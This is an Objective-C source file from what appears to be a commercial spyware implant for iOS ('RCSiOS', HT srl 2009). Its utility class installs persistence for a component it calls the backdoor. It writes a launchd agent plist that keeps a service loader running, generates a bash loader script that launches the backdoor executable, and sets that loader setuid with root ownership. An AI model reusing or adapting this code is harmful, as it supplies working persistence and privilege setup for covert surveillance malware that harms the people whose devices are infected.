/*
 * RCSiOS - Utils and stuff
 *
 *
 * Created on 08/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <fcntl.h>

#import "RCSIUtils.h"
#import "RCSICommon.h"

//#define DEBUG

@implementation RCSIUtils

- (id)initWithBackdoorPath: (NSString *)aBackdoorPath
             serviceLoader: (NSString *)aServiceLoaderPath
{
  self = [super init];
  
  if (self != nil)
    {
      mBackdoorPath       = [aBackdoorPath copy];
      mServiceLoaderPath  = [aServiceLoaderPath copy];
    }
  return self;
}

- (void)dealloc
{
  [mBackdoorPath release];
  [mServiceLoaderPath release];
  
  [super dealloc];
}


- (BOOL)createLaunchAgentPlist: (NSString *)aLabel
{
  NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity:1];
  NSDictionary *innerDict;
  
  innerDict = [[NSDictionary alloc] initWithObjectsAndKeys:
               aLabel, @"Label",
               [NSNumber numberWithBool: FALSE], @"OnDemand",
               [NSArray arrayWithObjects: mServiceLoaderPath, nil], @"ProgramArguments", nil];
  
  [rootObj addEntriesFromDictionary: innerDict];
  
  return [rootObj writeToFile: BACKDOOR_DAEMON_PLIST atomically: NO];
}

- (BOOL)createBackdoorLoader
{
  NSString *backdoorExec = [[NSBundle mainBundle] executablePath];
  NSString *backdoorPath = [[NSBundle mainBundle] bundlePath];
  NSString *myData = [NSString stringWithFormat:
                      @"#!/bin/bash\n cd %@\n %@\n", backdoorPath, backdoorExec];
  
  [myData writeToFile: mServiceLoaderPath
           atomically: NO
             encoding: NSASCIIStringEncoding
                error: nil];
  
  return [self makeSuidBinary: mServiceLoaderPath];
  
  return YES;
}

- (BOOL)makeSuidBinary: (NSString *)aBinary
{
  BOOL success;
  
  u_long permissions = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
  NSValue *permission = [NSNumber numberWithUnsignedLong:permissions];
  NSValue *owner = [NSNumber numberWithInt:0];
  
  success = [[NSFileManager defaultManager] changeFileAttributes:
             [NSDictionary dictionaryWithObjectsAndKeys: permission, 
                                                         NSFilePosixPermissions, 
                                                         owner, 
                                                         NSFileOwnerAccountID, 
                                                         nil] 
                                                          atPath: aBinary];  
  
  return success;  
}

- (NSString *)mBackdoorPath
{
  return mBackdoorPath;
}

- (void)setBackdoorPath: (NSString *)aValue
{
  if (aValue != mBackdoorPath)
    {
      [mBackdoorPath release];
      mBackdoorPath = [aValue retain];
    }
}

- (NSString *)mServiceLoaderPath
{
  return mServiceLoaderPath;
}

- (void)setServiceLoaderPath: (NSString *)aValue
{
  if (aValue != mServiceLoaderPath)
    {
      [mServiceLoaderPath release];
      mServiceLoaderPath = [aValue retain];
    }
}

@end
